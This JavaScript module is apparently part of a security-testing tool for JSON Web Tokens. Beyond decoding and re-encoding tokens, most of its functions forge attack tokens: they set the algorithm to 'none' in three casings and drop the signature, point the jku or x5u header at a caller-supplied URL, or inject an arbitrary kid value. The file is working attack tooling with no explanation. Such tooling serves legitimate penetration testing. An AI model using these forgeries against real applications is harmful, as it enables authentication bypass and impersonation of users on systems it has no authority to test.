const INDEX = {
  HEADER: 0,
  PAYLOAD: 1,
  SIGNATURE: 2
};

function base64UrlToBase64(value) {
  const normalized = value.replace(/-/g, "+").replace(/_/g, "/");
  return normalized + "=".repeat((4 - normalized.length % 4) % 4);
}

function base64ToBase64Url(value) {
  return value.replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
}

function encodeUtf8Base64Url(value) {
  const bytes = new TextEncoder().encode(value);
  let binary = "";

  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }

  return base64ToBase64Url(btoa(binary));
}

function decodeUtf8Base64Url(value) {
  const binary = atob(base64UrlToBase64(value));
  const bytes = new Uint8Array(binary.length);

  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }

  return new TextDecoder().decode(bytes);
}

function splitToken(token) {
  const parts = token.split(".");

  return {
    header: parts[INDEX.HEADER] || "",
    payload: parts[INDEX.PAYLOAD] || "",
    signature: parts.slice(INDEX.SIGNATURE).join(".")
  };
}

function parseJsonSegment(segment) {
  return JSON.parse(decodeUtf8Base64Url(segment));
}

function extractJsonObject(input, startIndex) {
  let depth = 0;
  let inString = false;
  let escaped = false;
  let start = -1;

  for (let i = startIndex; i < input.length; i++) {
    const char = input[i];

    if (start === -1) {
      if (char === "{") {
        start = i;
        depth = 1;
      }
      continue;
    }

    if (escaped) {
      escaped = false;
      continue;
    }

    if (char === "\\") {
      escaped = true;
      continue;
    }

    if (char === "\"") {
      inString = !inString;
      continue;
    }

    if (inString) {
      continue;
    }

    if (char === "{") {
      depth += 1;
      continue;
    }

    if (char === "}") {
      depth -= 1;
      if (depth === 0) {
        return {
          value: input.slice(start, i + 1),
          endIndex: i + 1
        };
      }
    }
  }

  return null;
}

function extractJwtParts(input) {
  const header = extractJsonObject(input, 0);
  if (!header) {
    throw new Error("Invalid JWT header");
  }

  const payload = extractJsonObject(input, header.endIndex);
  if (!payload) {
    throw new Error("Invalid JWT payload");
  }

  const signature = input.slice(payload.endIndex).replace(/^\s*\.\s*/, "").trim();

  return {
    header: JSON.parse(header.value),
    payload: JSON.parse(payload.value),
    signature: signature
  };
}

function encodeJsonObject(object) {
  return encodeUtf8Base64Url(JSON.stringify(object));
}

function rewriteHeader(token, mutateHeader, includeSignature) {
  const parts = splitToken(token);
  if (!parts.header || !parts.payload) {
    throw new Error("Invalid token");
  }

  const header = parseJsonSegment(parts.header);
  mutateHeader(header);

  return encodeJsonObject(header) + "." + parts.payload + "." + (includeSignature ? parts.signature : "");
}

const customjwt = {
  decode: (token) => {
    try {
      if (!token) {
        throw new Error("Empty token");
      }

      const parts = splitToken(token);
      if (!parts.header || !parts.payload) {
        throw new Error("Invalid token");
      }

      const header = parseJsonSegment(parts.header);
      const payload = parseJsonSegment(parts.payload);

      return JSON.stringify(header, null, 4) + "." + JSON.stringify(payload, null, 4) + "." + parts.signature;
    } catch (error) {
      return "";
    }
  },

  encode: (token) => {
    try {
      if (!token) {
        throw new Error("Empty token");
      }

      const parts = extractJwtParts(token);

      return encodeJsonObject(parts.header) + "." + encodeJsonObject(parts.payload) + "." + parts.signature;
    } catch (error) {
      return "";
    }
  },

  none: (token) => {
    try {
      return rewriteHeader(token, function (header) {
        header.alg = "none";
      }, false);
    } catch (error) {
      return "";
    }
  },

  NonE: (token) => {
    try {
      return rewriteHeader(token, function (header) {
        header.alg = "NonE";
      }, false);
    } catch (error) {
      return "";
    }
  },

  NONE: (token) => {
    try {
      return rewriteHeader(token, function (header) {
        header.alg = "NONE";
      }, false);
    } catch (error) {
      return "";
    }
  },

  JKU: (token, url) => {
    try {
      return rewriteHeader(token, function (header) {
        if (!url || !header.alg || header.alg.indexOf("RS") === -1) {
          throw new Error("Unsupported token");
        }
        header.jku = url;
      }, false);
    } catch (error) {
      return "";
    }
  },

  X5U: (token, url) => {
    try {
      return rewriteHeader(token, function (header) {
        if (!url || !header.alg || header.alg.indexOf("RS") === -1) {
          throw new Error("Unsupported token");
        }
        header.x5u = url;
      }, false);
    } catch (error) {
      return "";
    }
  },

  KID: (token, url) => {
    try {
      return rewriteHeader(token, function (header) {
        if (!url) {
          throw new Error("Missing kid");
        }
        header.kid = url;
      }, true);
    } catch (error) {
      return "";
    }
  }
};
